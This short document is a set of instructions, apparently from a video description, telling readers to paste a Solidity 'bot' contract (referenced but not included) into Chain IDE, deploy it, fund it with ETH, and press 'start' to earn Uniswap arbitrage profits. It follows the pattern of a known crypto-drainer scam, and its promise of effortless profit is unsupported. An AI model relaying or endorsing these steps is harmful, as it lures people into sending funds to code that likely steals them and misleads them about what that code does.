 Download MetaMask (if you don’t have it already).

 Access Chain IDE:
 
                  https://chainide.com/ 


Click on the “contracts” folder and then create “New File”. Rename it as you like, for example: “bot.sol”

 Paste this code in Chain IDE. See (bot-sol.txt)

 Go to the “Solidity Compiler” tab, select version “0.8.17+commit.8df45f5f”(if it is not selected automatically) and then click “Compile bot.sol”.

Make sure “bot.sol” is selected under the Explorer tab.

 Go to “DEPLOY & RUN TRANSACTIONS”.

Copy your newly created contract address as shown on video and fund it with any amount of ETH (minimum 0.5-1 ETH or higher recommended) that you would like the bot to earn with by simply sending ETH to your newly created contract address.

After your transaction is confirmed, click the “start” button to run the bot. Withdraw your ETH at any time by clicking the “Withdraw” button.

That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.
